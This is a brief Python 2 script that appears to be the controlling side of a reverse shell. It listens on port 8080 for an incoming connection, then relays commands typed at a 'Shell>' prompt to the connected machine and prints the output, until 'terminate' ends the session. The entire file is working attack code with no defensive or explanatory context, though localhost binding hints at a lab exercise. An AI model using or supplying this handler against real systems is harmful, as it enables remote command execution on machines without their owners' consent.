import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 8080))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] We got a connection from: " + str(addr))
    while True:
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print(conn.recv(1024))
def main():
    connect()
main()
